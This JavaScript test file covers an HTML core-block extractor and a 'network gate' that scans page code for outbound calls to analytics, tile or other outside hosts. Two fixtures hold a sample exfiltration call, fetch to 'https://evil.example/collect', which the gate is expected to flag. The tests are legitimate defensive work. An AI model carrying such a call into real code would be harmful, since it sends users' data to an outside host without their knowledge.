// Extraction is what replaces a build step, so it is load-bearing: every gate
// and the whole headless suite read the core through it. If it silently picked
// the wrong block, or quietly returned an empty string, the gates would pass on
// code nobody checked.

import { test } from "node:test";
import assert from "node:assert/strict";
import { extractCore } from "../scripts2/extract-core.js";

const wrap = (body, attrs = 'id="gnomon-core"') =>
  `<!doctype html><html><body>\n<script ${attrs}>${body}</script>\n</body></html>`;

test("returns the contents of the core block", () => {
  assert.equal(extractCore(wrap("const a = 1;")), "const a = 1;");
});

test("ignores other script blocks", () => {
  const html = `<script>shell();</script>${wrap("core();")}<script>more();</script>`;
  assert.equal(extractCore(html), "core();");
});

test("tolerates attribute order and single quotes", () => {
  assert.equal(extractCore(wrap("x", `type="module" id='gnomon-core'`)), "x");
});

test("throws when there is no core block", () => {
  assert.throws(() => extractCore("<html><script>shell();</script></html>"), /no <script/);
});

test("throws when the core block is never closed", () => {
  assert.throws(() => extractCore(`<script id="gnomon-core">const a = 1;`), /never closed/);
});

// Two core blocks would mean the gates check one and the app runs both.
test("throws when there is more than one core block", () => {
  assert.throws(
    () => extractCore(`${wrap("a();")}${wrap("b();")}`),
    /more than one/,
  );
});

// The network gate strips comments before scanning, because it is about what
// the page DOES. An earlier version matched the bare word "plausible" and fired
// on a comment explaining the network policy — a gate that cries wolf on prose
// is one people learn to ignore, which is worse than not having one.
test("comment stripping blanks comments but preserves line numbers", async () => {
  const { stripComments } = await import("../scripts2/check-network.js");
  const source = [
    "const a = 1;",
    "/* a comment mentioning plausible and analytics",
    "   over several lines */",
    "const b = 2; // trailing mention of posthog",
    "<!-- an html comment about mapbox -->",
    "const c = 3;",
  ].join("\n");
  const out = stripComments(source);

  assert.equal(out.split("\n").length, 6, "line count must survive");
  assert.match(out.split("\n")[0], /const a = 1;/);
  assert.doesNotMatch(out, /plausible/);
  assert.doesNotMatch(out, /posthog/);
  assert.doesNotMatch(out, /mapbox/);
  assert.match(out.split("\n")[5], /const c = 3;/);
});

test("stripping does not eat a URL that is real code", async () => {
  const { stripComments } = await import("../scripts2/check-network.js");
  const kept = stripComments('fetch("https://evil.example/collect");');
  assert.match(kept, /evil\.example/, "a real call must still be visible to the gate");
});

// The gate must still see a real call — blanking comments must not blank code.
test("the gate catches a genuine violation and reports its line", async () => {
  const { scan } = await import("../scripts2/check-network.js");
  const html = [
    "<script>",
    "  // a comment about mapbox and plausible",
    '  fetch("https://evil.example/collect");',
    "</script>",
  ].join("\n");
  const found = scan(html);
  assert.equal(found.length, 1, `expected exactly one violation, got ${JSON.stringify(found)}`);
  assert.equal(found[0].line, 3, "line number must survive comment blanking");
  assert.match(found[0].why, /evil\.example/);
});

test("the gate refuses a tile URL template", async () => {
  const { scan } = await import("../scripts2/check-network.js");
  const found = scan('const url = "https://cdn.jsdelivr.net/{z}/{x}/{y}.png";');
  assert.ok(found.some((v) => /tile/i.test(v.why)), "a tile template must be caught even on an allowed host");
});
